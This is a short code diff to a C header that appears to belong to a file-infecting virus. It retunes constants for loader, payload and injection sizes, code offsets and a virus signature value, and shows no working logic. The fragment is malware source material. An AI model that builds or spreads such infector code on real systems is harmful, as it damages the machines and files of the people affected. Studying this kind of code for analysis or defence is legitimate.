@@ -12,23 +12,23 @@
 # include <fcntl.h>
 # include <limits.h>
 
-# define KEY 0x12345678
+// # define KEY 0x12345678
 # define SUB 0x95837523
 # define MAGIC_VIRUS 0x4E505241
 # define SIGN_SIZE 0x28
 
-# define FT_MEMCPY_ADDR 0x12d0
+# define FT_MEMCPY_ADDR 0x1300
 # define BUF_SIZE 0x20
-# define END_SIZE 0xd2
-# define LOADER_SIZE 0xcd
-# define PAYLOAD_SIZE 0x2c38 - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x2b76 - FT_MEMCPY_ADDR
+# define END_SIZE 0xe5
+# define LOADER_SIZE 0xe5
+# define PAYLOAD_SIZE 0x2ce0 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x2c1e - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
-# define OFFSET_1 0x20f6 - FT_MEMCPY_ADDR
-# define OFFSET_2 0x221d - FT_MEMCPY_ADDR
-# define OFFSET_3 0x2431 - FT_MEMCPY_ADDR
-# define OFFSET_4 0x2b81 - FT_MEMCPY_ADDR
+# define OFFSET_1 0x20c3 - FT_MEMCPY_ADDR
+# define OFFSET_2 0x21ea - FT_MEMCPY_ADDR
+# define OFFSET_3 0x23fe - FT_MEMCPY_ADDR
+# define OFFSET_4 0x2c29 - FT_MEMCPY_ADDR
 
 typedef struct		s_info
 {
